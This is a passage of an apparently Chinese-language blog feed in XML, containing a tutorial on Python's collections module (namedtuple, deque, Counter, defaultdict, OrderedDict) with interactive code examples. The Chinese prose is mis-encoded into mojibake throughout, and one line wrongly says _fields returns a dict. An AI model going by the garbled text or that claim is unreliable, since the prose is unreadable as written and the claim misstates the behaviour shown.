      &lt;p&gt;å•å…ƒæµ‹è¯•ï¼Œå·¥ç¨‹å¼€å‘ä¸­é‡è¦çš„ä¸€ç¯ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="//blog.stdioa.com/categories/Python/"/>
    
    
      <category term="python" scheme="//blog.stdioa.com/tags/python/"/>
    
      <category term="unittest" scheme="//blog.stdioa.com/tags/unittest/"/>
    
  </entry>
  
  <entry>
    <title>Pythonå­¦ä¹ ä¹‹collections</title>
    <link href="//blog.stdioa.com/2015/10/learning-python-collections/"/>
    <id>//blog.stdioa.com/2015/10/learning-python-collections/</id>
    <published>2015-10-29T12:55:00.000Z</published>
    <updated>2016-11-08T13:48:35.517Z</updated>
    
    <content type="html"><![CDATA[<p>collectionæ˜¯Pythonå†…å»ºçš„ä¸€ä¸ªå®ç”¨å·¥å…·åŒ…ï¼Œæä¾›ä¸€äº›ä½¿ç”¨çš„å®¹å™¨ï¼Œç”¨äºå¯¹ä¼ ç»Ÿå®¹å™¨ç±»å‹è¿›è¡ŒåŠŸèƒ½æå‡ã€‚</p>
<a id="more"></a>
<h1 id="1">1. ç®€ä»‹</h1>
<p>ä¸Šé¢å°±æ˜¯ç®€ä»‹ï¼Œä¸ä¼šæ‰¯äº†ï¼Œè´´ä¸¤ä¸ªé“¾æ¥å¥½äº†ã€‚
<a href="http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/001411031239400f7181f65f33a4623bc42276a605debf6000" target="_blank" rel="external">Collections - å»–é›ªå³°çš„Pythonæ•™ç¨‹</a>
<a href="https://docs.python.org/2.7/library/collections.html#module-collections" target="_blank" rel="external">Collections - High-performance container datatypes - Python Doc</a></p>
<h1 id="2-namedtuple">2. namedtuple</h1>
<h2 id="21">2.1 åŠŸèƒ½ç®€ä»‹</h2>
<p><code>namedtuple</code>ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºäº§ç”Ÿä¸€ä¸ªtupleç±»çš„å­ç±»ã€‚ç”±è¯¥ç±»å®ä¾‹åŒ–åçš„å¯¹è±¡å¯ä»¥åƒtupleä¸€æ ·pack/unpackï¼Œä¹Ÿå¯ä»¥é€šè¿‡é¢„å…ˆå®šä¹‰å¥½çš„æˆå‘˜åç§°è®¿é—®å¯¹è±¡å†…éƒ¨çš„æ•°æ®ã€‚ä¾‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; from collections import namedtuple</div><div class="line">&gt;&gt;&gt; Point = namedtuple(<span class="string">"Point"</span>, [<span class="string">'x'</span>, <span class="string">'y'</span>])</div><div class="line">&gt;&gt;&gt; Point                                           <span class="comment"># namedtupleå‡½æ•°è¿”å›ä¸€ä¸ªç±»</span></div><div class="line">&lt;class <span class="string">'__main__.Point'</span>&gt;</div><div class="line">&gt;&gt;&gt; Point.__base__</div><div class="line">&lt;<span class="built_in">type</span> <span class="string">'tuple'</span>&gt;</div><div class="line">&gt;&gt;&gt; Point(x=1, y=2)</div><div class="line">Point(x=1, y=2)</div><div class="line">&gt;&gt;&gt; Point(1,2)                                      <span class="comment"># ä¸¤ç§å®šä¹‰æ–¹å¼å‡å¯ï¼Œä½†æ˜¯è¦æ³¨æ„çš„æ˜¯ï¼ŒPointçš„å‚æ•°é•¿åº¦æ˜¯ä¸å¯å˜çš„</span></div><div class="line">Point(x=1, y=2)</div><div class="line">&gt;&gt;&gt; p = Point(1, 2)</div><div class="line">&gt;&gt;&gt; p.x</div><div class="line">1</div><div class="line">&gt;&gt;&gt; x, y = p                                        <span class="comment"># å¯ä»¥åƒtupleä¸€æ ·è¿›è¡Œunpack</span></div><div class="line">&gt;&gt;&gt; x</div><div class="line">1</div><div class="line">&gt;&gt;&gt; Point._make((1,2))                              <span class="comment"># packçš„æ–¹å¼å’Œtupleä¸åŒ</span></div><div class="line">Point(x=1, y=2)</div></pre></td></tr></table></figure>
<h2 id="22">2.2 æˆå‘˜å‡½æ•°</h2>
<ul>
<li><code>somenamedtuple._make(iterable)</code>, å°†ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡ï¼ˆlist, tupleç­‰ï¼‰è½¬åŒ–ä¸ºä¸€ä¸ªnamedtupleå¯¹è±¡ã€‚</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>t = [<span class="number">11</span>, <span class="number">22</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>Point._make(t)</div><div class="line">Point(x=<span class="number">11</span>, y=<span class="number">22</span>)</div></pre></td></tr></table></figure>
<ul>
<li><code>somenamedtuple._asdict()</code>, å°†å¯¹è±¡è½¬åŒ–ä¸€ä¸ªä¸ºé”®å€¼å’Œæ•°æ®å¯¹åº”çš„OrderedDict.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>p._asdict()</div><div class="line">OrderedDict([(<span class="string">'x'</span>, <span class="number">11</span>), (<span class="string">'y'</span>, <span class="number">22</span>)])</div></pre></td></tr></table></figure>
<ul>
<li><code>somenamedtuple._replace(kwargs)</code>, è¿”å›ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œè¯¥å¯¹è±¡ä¸­çš„å€¼æŒ‰ç…§_replaceå‡½æ•°ä¸­çš„å‚æ•°æ‰€æ”¹å˜ã€‚</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>p = Point(x=<span class="number">11</span>, y=<span class="number">22</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>p._replace(x=<span class="number">33</span>)</div><div class="line">Point(x=<span class="number">33</span>, y=<span class="number">22</span>)</div></pre></td></tr></table></figure>
<ul>
<li><code>somenamedtuple._fields</code>, è¿”å›ä¸€ä¸ªæ‰€æœ‰é”®å€¼æ„æˆçš„dict.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>p._fields                                                       <span class="comment"># æŸ¥çœ‹é”®å€¼åå­—</span></div><div class="line">(<span class="string">'x'</span>, <span class="string">'y'</span>)</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>Color = namedtuple(<span class="string">'Color'</span>, <span class="string">'red green blue'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>Pixel = namedtuple(<span class="string">'Pixel'</span>, Point._fields + Color._fields)      <span class="comment"># å°†Colorå’ŒPointâ€œåˆå¹¶â€</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>Pixel(<span class="number">11</span>, <span class="number">22</span>, <span class="number">128</span>, <span class="number">255</span>, <span class="number">0</span>)</div><div class="line">Pixel(x=<span class="number">11</span>, y=<span class="number">22</span>, red=<span class="number">128</span>, green=<span class="number">255</span>, blue=<span class="number">0</span>)</div></pre></td></tr></table></figure>
<h2 id="23">2.3 åº”ç”¨åœºæ™¯</h2>
<p>åˆ—ä¸¾ä¸€ä¸ªåº”ç”¨åœºæ™¯ï¼šåœ¨è¿›è¡ŒsqlæŸ¥è¯¢æ—¶ï¼Œ<code>cur.fetchone()</code>ä¼šè¿”å›ä¸€ä¸ªtupleè€Œä¸æ˜¯dictï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€ä¸ªnamedtuple, ç„¶åå°†sqlçš„æŸ¥è¯¢æ•°æ®è½¬ä¸ºnamedtupleç±»ï¼Œç„¶åé€šè¿‡æˆå‘˜å‡½æ•°è®¿é—®ã€‚ä¸¾ä¸ªæ —å­ï¼ˆç§è´§ï¼‰ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">Account = namedtuple(<span class="string">"Account"</span>, [<span class="string">"username"</span>, <span class="string">"password"</span>])   <span class="comment"># å®šä¹‰Accountç±»</span></div><div class="line">...</div><div class="line">cur = self.db.cursor()</div><div class="line">cur.execute(<span class="string">"SELECT username, password FROM account\</span></div><div class="line">                WHERE valid=1\</div><div class="line">                ORDER BY RANDOM()\</div><div class="line">                LIMIT 1")</div><div class="line">account= Account._make(cur.fetchone())                      <span class="comment"># å°†æ•°æ®tupleè½¬ä¸ºAccountå¯¹è±¡</span></div><div class="line">self.postdata[<span class="string">"username"</span>] = account.username                <span class="comment"># ç›´æ¥è®¿é—®æˆå‘˜æ•°æ®</span></div><div class="line">self.postdata[<span class="string">"password"</span>] = account.password</div><div class="line">...</div><div class="line"><span class="comment"># self.login(username, password)</span></div><div class="line">self.login(account)                                         <span class="comment"># å¯ä»¥å°†accountæ•´ä½“ä½œä¸ºå‚æ•°ï¼Œä½¿ç¨‹åºçœ‹èµ·æ¥æ›´ç®€æ´</span></div><div class="line">...</div></pre></td></tr></table></figure>
<h1 id="3-deque-">3. deque - åŒç«¯é˜Ÿåˆ—</h1>
<h2 id="31">3.1 ä»‹ç»</h2>
<p>dequeä¸ºDouble-Ended Queueçš„ç®€å†™ï¼Œç”¨äºæä¾›ä¸€ä¸ªå¯ä»¥å¿«é€Ÿè¿›è¡Œä¸¤ç«¯çš„æ’å…¥æˆ–åˆ é™¤æ“ä½œçš„é˜Ÿåˆ—ï¼ŒåŒæ—¶å¯ä»¥åƒlistä¸€æ ·é€šè¿‡ä¸‹æ ‡è®¿é—®æ•°æ®ã€‚ç”±äºlistæ˜¯å‚¨å­˜åœ¨çº¿æ€§ç©ºé—´çš„ï¼Œå…¶æ’å…¥/åˆ é™¤æ•°æ®çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(n)ï¼Œæ‰€ä»¥å½“listæ¯”è¾ƒé•¿çš„æ—¶å€™ï¼Œåœ¨å…¶å¤´éƒ¨æ’å…¥/åˆ é™¤æ•°æ®çš„æ“ä½œéœ€è¦è€—è´¹å¤§é‡æ—¶é—´ã€‚æ‰€ä»¥å¦‚æœéœ€è¦å¯¹listå¯¹è±¡è¿›è¡Œå¤§é‡å¤´å’Œå°¾çš„æ’å…¥åˆ é™¤æ“ä½œæ—¶ï¼Œä½¿ç”¨dequeä¼šä½¿ç¨‹åºçš„è¿è¡Œæ•ˆç‡æ›´é«˜ï¼ˆå½“ç„¶ï¼Œä½¿ç”¨Queueæ¨¡å—çš„Queueå’ŒLifoQueueä¹Ÿæ˜¯ä¸é”™çš„é€‰æ‹©ï¼‰ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œdequeå¯¹è±¡ä¸æ”¯æŒåœ¨ä¸­é—´ä½ç½®çš„æ’å…¥æ“ä½œã€‚
dequeå¯¹è±¡ä¹Ÿè¢«åŒ…å«åœ¨Queueæ¨¡å—ä¸­ã€‚</p>
<h2 id="32">3.2 æˆå‘˜å‡½æ•°</h2>
<ul>
<li><code>append(x)</code>, <code>appendleft(x)</code>, åœ¨dequeçš„å°¾/å¤´æ’å…¥å¯¹è±¡x, ä¸listç±»ä¼¼ï¼›</li>
<li><code>extend(iterable)</code>, <code>extendleft(iterable)</code>, ä¸listçš„extendç±»ä¼¼ï¼›</li>
<li><code>pop(x)</code>, <code>popleft(x)</code>, ä¸listçš„popç±»ä¼¼ï¼›</li>
<li><code>clear()</code>, æ¸…ç©ºdequeçš„æ‰€æœ‰å…ƒç´ ï¼›</li>
<li><code>count(x)</code>, ç»Ÿè®¡dequeä¸­xå…ƒç´ çš„ä¸ªæ•°ï¼›</li>
<li><code>remove(x)</code>, åˆ é™¤dequeä¸­çš„xå…ƒç´ ï¼Œè‹¥xå…ƒç´ ä¸å­˜åœ¨ï¼Œåˆ™è§¦å‘ValueError;</li>
<li><code>reverse()</code>, å°†dequeåè½¬ï¼Œè¿”å›None, ä¸listçš„reverseç±»ä¼¼;</li>
<li><code>rotate(i)</code>, å°†dequeæœ€æœ«å°¾iä¸ªå…ƒç´ å–å‡ºå¹¶æ’å…¥å¤´éƒ¨ï¼Œè‹¥i&lt;0, åˆ™å°†å¤´éƒ¨|i|ä¸ªå…ƒç´ å–å‡ºæ·»åŠ åˆ°å°¾éƒ¨ã€‚</li>
</ul>
<h1 id="4-counter-">4. Counter - è®¡æ•°å™¨</h1>
<h2 id="41">4.1 ä»‹ç»</h2>
<p>Counterç±»æ˜¯dictçš„å­ç±»ï¼Œæä¾›ä¸€ä¸ªè®¡æ•°å™¨ï¼Œå¯å¯¹hashableçš„å¯¹è±¡è¿›è¡Œè®¡æ•°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹è±¡çš„è®¡æ•°å¯ä»¥å°äº0.</p>
<h2 id="42">4.2 åŸºæœ¬æ“ä½œ</h2>
<p>ç›´æ¥ä¸Šä¾‹å­ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>c = Counter()                           <span class="comment"># ç©ºè®¡æ•°å™¨</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c = Counter(<span class="string">'gallahad'</span>)                 <span class="comment"># å¯¹iterableå¯¹è±¡ä¸­çš„å…ƒç´ è¿›è¡Œè®¡æ•°</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c = Counter(&#123;<span class="string">'red'</span>: <span class="number">4</span>, <span class="string">'blue'</span>: <span class="number">2</span>&#125;)      <span class="comment"># ä»mapä¸­è¯»å–å…ƒç´ å’Œå¯¹åº”è®¡æ•°</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c = Counter(cats=<span class="number">4</span>, dogs=<span class="number">8</span>)             <span class="comment"># ä»å…³é”®å­—å‚æ•°ä¸­è·å–</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c</div><div class="line">Counter(&#123;<span class="string">'dogs'</span>: <span class="number">8</span>, <span class="string">'cats'</span>: <span class="number">4</span>&#125;)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c[<span class="string">"dogs"</span>]                               <span class="comment"># è·å–è®¡æ•°</span></div><div class="line"><span class="number">8</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c[<span class="string">"elephants"</span>]                          <span class="comment"># å¯¹äºä¸å­˜åœ¨çš„å…ƒç´ ï¼Œä¼šè¿”å›0 </span></div><div class="line"><span class="number">0</span></div></pre></td></tr></table></figure>
<h2 id="43">4.3 æˆå‘˜å‡½æ•°</h2>
<ul>
<li><code>elements()</code>, è¿”å›ä¸€ä¸ªè¿­ä»£å™¨ï¼ŒåŒ…å«Counterä¸­çš„æ‰€æœ‰å…ƒç´ ï¼Œè‹¥å…ƒç´ xçš„è®¡æ•°ä¸ºnï¼Œåˆ™xåœ¨è¿­ä»£å™¨ä¸­ä¼šå‡ºç°næ¬¡ã€‚</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">c = Counter(a=<span class="number">4</span>, b=<span class="number">2</span>, c=<span class="number">0</span>, d=<span class="number">-2</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list(c.elements())</div><div class="line">[<span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'b'</span>]</div></pre></td></tr></table></figure>
<ul>
<li><code>most_common([n])</code>, è¿”å›è®¡æ•°æœ€å¤šçš„nä¸ªå…ƒç´ ã€‚</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>Counter(<span class="string">'abracadabra'</span>).most_common(<span class="number">3</span>)</div><div class="line">[(<span class="string">'a'</span>, <span class="number">5</span>), (<span class="string">'r'</span>, <span class="number">2</span>), (<span class="string">'b'</span>, <span class="number">2</span>)]</div></pre></td></tr></table></figure>
<ul>
<li><code>update([iterable-or-mapping])</code>, åœ¨ç°æœ‰è®¡æ•°ä¸Šæ·»åŠ å‚æ•°æ‰€å¯¹åº”çš„è®¡æ•°ã€‚</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>c = Counter(<span class="string">"1233"</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c</div><div class="line">Counter(&#123;<span class="string">'3'</span>: <span class="number">2</span>, <span class="string">'1'</span>: <span class="number">1</span>, <span class="string">'2'</span>: <span class="number">1</span>&#125;)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c.update(<span class="string">"2345"</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c</div><div class="line">Counter(&#123;<span class="string">'3'</span>: <span class="number">3</span>, <span class="string">'2'</span>: <span class="number">2</span>, <span class="string">'1'</span>: <span class="number">1</span>, <span class="string">'5'</span>: <span class="number">1</span>, <span class="string">'4'</span>: <span class="number">1</span>&#125;)</div></pre></td></tr></table></figure>
<ul>
<li><code>substact([iterable-or-mapping])</code>, åœ¨ç°æœ‰è®¡æ•°ä¸Šå‡å»å‚æ•°æ‰€å¯¹åº”çš„è®¡æ•°ã€‚</li>
</ul>
<p>å¯ä»¥ç”¨åœ¨Counterå¯¹è±¡ä¸Šçš„é€šç”¨å‡½æ•°å’Œå¸¸è§ç”¨æ³•æœ‰ï¼š</p>
<ul>
<li><code>sum(c.values())</code>, æ‰€æœ‰è®¡æ•°ä¹‹å’Œ</li>
<li><code>c.clear()</code>, å°†è®¡æ•°é‡ç½®</li>
<li><code>list(c)</code>, è¿”å›æ‰€æœ‰å…ƒç´ æ„æˆçš„åˆ—è¡¨, å…¶ä¸­å…ƒç´ ä¸ä¼šé‡å¤</li>
<li><code>set(c)</code>, è½¬åŒ–ä¸ºset</li>
<li><code>dict(c)</code>, è½¬åŒ–ä¸ºdict</li>
<li><code>c.items()</code>, è½¬åŒ–ä¸ºç”±(å…ƒç´ , è®¡æ•°)æ„æˆçš„åˆ—è¡¨</li>
<li><code>Counter(dict(list_of_pairs))</code>, ä»ä¸Šè¿°åˆ—è¡¨è½¬åŒ–ä¸ºCounterå¯¹è±¡</li>
<li><code>c.most_common()[:-n-1:-1]</code>, å‡ºç°æœ€å°‘çš„nä¸ªå…ƒç´ </li>
<li><code>c += Counter()</code>, ç§»é™¤æ‰€æœ‰å…ƒç´ è®¡æ•°ä¸º0çš„å…ƒç´ 
æ³¨æ„: å°†æŸå…ƒç´ çš„è®¡æ•°èµ‹å€¼ä¸º0, å¹¶ä¸èƒ½åœ¨è®¡æ•°å™¨çš„å…ƒç´ åˆ—è¡¨ä¸­åˆ é™¤è¯¥å…ƒç´ ã€‚è‹¥è¦åˆ é™¤è¯¥å…ƒç´ ï¼Œéœ€è¦ç”¨<code>del</code>.</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>c = Counter(<span class="string">"12"</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c</div><div class="line">Counter(&#123;<span class="string">'1'</span>: <span class="number">1</span>, <span class="string">'2'</span>: <span class="number">1</span>&#125;)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c[<span class="string">"0"</span>]</div><div class="line"><span class="number">0</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c</div><div class="line">Counter(&#123;<span class="string">'1'</span>: <span class="number">1</span>, <span class="string">'2'</span>: <span class="number">1</span>&#125;)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c[<span class="string">"0"</span>] = <span class="number">0</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c</div><div class="line">Counter(&#123;<span class="string">'1'</span>: <span class="number">1</span>, <span class="string">'2'</span>: <span class="number">1</span>, <span class="string">'0'</span>: <span class="number">0</span>&#125;)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> c[<span class="string">"0"</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>c</div><div class="line">Counter(&#123;<span class="string">'1'</span>: <span class="number">1</span>, <span class="string">'2'</span>: <span class="number">1</span>&#125;)</div></pre></td></tr></table></figure>
<h1 id="5-defaultdict">5. defaultdict</h1>
<h2 id="51">5.1 ä»‹ç»</h2>
<p>defaultdictç±»æ˜¯dictç±»çš„å­ç±»ï¼ŒåŒ…å«dictç±»çš„æ‰€æœ‰åŠŸèƒ½ã€‚ä¸dictä¸åŒçš„æ˜¯ï¼Œåœ¨è°ƒç”¨ä¸å­˜åœ¨çš„é”®å€¼æ—¶ï¼Œdictä¼šæŠ›å‡º<code>KeyError</code>å¼‚å¸¸ï¼Œè€Œdefaultdictä¼šæ‰§è¡Œ<code>__missing__</code>å‡½æ•°, é€šè¿‡è°ƒç”¨è¯¥å‡½æ•°æ¥è¿›è¡Œæ“ä½œæˆ–è¿”å›å€¼ã€‚
å®šä¹‰æ–¹å¼å¦‚ä¸‹:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">d = defaultdict()                                   <span class="comment"># è¿™ç§å®šä¹‰æ–¹å¼è¿”å›çš„å¯¹è±¡è·Ÿæ™®é€šdictæ— å¼‚</span></div><div class="line">a = defaultdict(<span class="keyword">lambda</span>: <span class="string">"N/A"</span>)                      <span class="comment"># å®šä¹‰__missing__å‡½æ•°</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> a[<span class="string">"0"</span>]                                        <span class="comment"># è¿”å›"N/A", åŒæ—¶a["0"]è¢«èµ‹å€¼ä¸º"N/A"</span></div></pre></td></tr></table></figure>
<h2 id="52">5.2 åº”ç”¨åœºæ™¯</h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = [(<span class="string">'yellow'</span>, <span class="number">1</span>), (<span class="string">'blue'</span>, <span class="number">2</span>), (<span class="string">'yellow'</span>, <span class="number">3</span>), (<span class="string">'blue'</span>, <span class="number">4</span>), (<span class="string">'red'</span>, <span class="number">1</span>)]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d = defaultdict(list)                                           <span class="comment"># è‹¥é”®å€¼ä¸å­˜åœ¨ï¼Œåˆ™èµ‹å€¼ä¸º[]</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> k, v <span class="keyword">in</span> s:</div><div class="line"><span class="meta">... </span>    d[k].append(v)</div><div class="line">...</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>d.items()</div><div class="line">[(<span class="string">'blue'</span>, [<span class="number">2</span>, <span class="number">4</span>]), (<span class="string">'red'</span>, [<span class="number">1</span>]), (<span class="string">'yellow'</span>, [<span class="number">1</span>, <span class="number">3</span>])]</div></pre></td></tr></table></figure>
<h1 id="6-orderddict">6. OrderdDict</h1>
<h2 id="61">6.1 ç®€ä»‹</h2>
<p>ä½¿ç”¨<code>dict</code>æ—¶ï¼ŒKeyæ˜¯æ— åºçš„ã€‚åœ¨å¯¹<code>dict</code>åšè¿­ä»£æ—¶ï¼Œæˆ‘ä»¬æ— æ³•ç¡®å®šKeyçš„é¡ºåºã€‚å¦‚æœè¦ä¿æŒKeyçš„é¡ºåºï¼Œå¯ä»¥ç”¨<code>OrderedDict</code>.
<code>OrderedDict</code>çš„é”®å€¼é¡ºåºæŒ‰ç…§é”®å€¼è¢«æ’å…¥çš„é¡ºåºæ’åˆ—ï¼Œè€Œä¸æ˜¯Keyæœ¬èº«çš„é¡ºåºã€‚
<code>OrderdDict</code>çš„é”®å€¼å¯ä»¥é€šè¿‡è°ƒç”¨<code>popitem</code>å‡½æ•°è¢«å¼¹å‡ºï¼Œå¼¹å‡ºæ—¶å¼¹å‡º(key, item)çš„é”®å€¼å¯¹ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>a = OrderedDict(&#123;<span class="string">"one"</span>: <span class="number">1</span>&#125;)                     <span class="comment"># å¯é€šè¿‡dictå®šä¹‰ï¼Œä¹Ÿå¯ä¼ å…¥å¯è¿­ä»£å¯¹è±¡</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="string">"zero"</span>] = <span class="number">0</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="string">"two"</span>] = <span class="number">2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a</div><div class="line">OrderedDict([(<span class="string">'one'</span>, <span class="number">1</span>), (<span class="string">'zero'</span>, <span class="number">0</span>), (<span class="string">'two'</span>, <span class="number">2</span>)])</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a.popitem()                                     <span class="comment"># å¼¹å‡ºæœ€åä¸€ä¸ªé”®å€¼å¯¹</span></div><div class="line">(<span class="string">'two'</span>, <span class="number">2</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a.popitem(last=<span class="keyword">False</span>)                           <span class="comment"># å¼¹å‡ºç¬¬ä¸€ä¸ªé”®å€¼å¯¹</span></div><div class="line">(<span class="string">'one'</span>, <span class="number">1</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>a</div><div class="line">OrderedDict([(<span class="string">'zero'</span>, <span class="number">0</span>)])</div></pre></td></tr></table></figure>
<h1 id="7">7. å‚è€ƒæ–‡æ¡£</h1>
<ol>
<li><a href="https://docs.python.org/2.7/library/collections.html#collections.OrderedDict" target="_blank" rel="external">8.3 collections â€” High-performance container datatypes</a></li>
<li><a href="http://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/001411031239400f7181f65f33a4623bc42276a605debf6000" target="_blank" rel="external">collections - å»–é›ªå³°çš„å®˜æ–¹æ•™ç¨‹</a></li>
</ol>
<h1 id="8">8. åè®°</h1>
<p>è¿™ç¯‡åšæ–‡å†™äº†ä¸¤å¤©ï¼Œæ„Ÿè§‰åœ¨ç¿»è¯‘æ–‡æ¡£ï¼Œæœ‰ç‚¹æ¯ç‡¥ã€‚ä¸€ç›´è§‰å¾—åº”è¯¥å¤šå»äº†è§£Pythonçš„å†…ç½®å¸¸ç”¨æ¨¡å—ï¼Œä¸è¦æ±‚å®Œå…¨ç†Ÿç»ƒï¼Œè‡³å°‘è¦æœ‰ä¸ªå°è±¡ï¼Œè¿™æ ·åœ¨å¼€å‘ä¸­éœ€è¦ä½¿ç”¨è¿™äº›æ¨¡å—çš„æ—¶å€™ï¼Œæ‰èƒ½å¤Ÿæƒ³èµ·æ¥ç”¨å®ƒã€‚
æ‰€ä»¥ï¼Œåˆå¡«å®Œä¸€ä¸ªå‘ã€‚ä¸‹ä¸€ä¸ªåº”è¯¥æ˜¯unittestå§ã€‚</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;collectionæ˜¯Pythonå†…å»ºçš„ä¸€ä¸ªå®ç”¨å·¥å…·åŒ…ï¼Œæä¾›ä¸€äº›ä½¿ç”¨çš„å®¹å™¨ï¼Œç”¨äºå¯¹ä¼ ç»Ÿå®¹å™¨ç±»å‹è¿›è¡ŒåŠŸèƒ½æå‡ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="//blog.stdioa.com/categories/Python/"/>
    
    
      <category term="python" scheme="//blog.stdioa.com/tags/python/"/>
    
      <category term="collections" scheme="//blog.stdioa.com/tags/collections/"/>
    
  </entry>
  
  <entry>
    <title>Pythonå­¦ä¹ ä¹‹è¿­ä»£å™¨</title>
    <link href="//blog.stdioa.com/2015/10/learning-python-iterator/"/>
    <id>//blog.stdioa.com/2015/10/learning-python-iterator/</id>
    <published>2015-10-26T07:43:00.000Z</published>
    <updated>2016-11-08T13:48:35.528Z</updated>
    
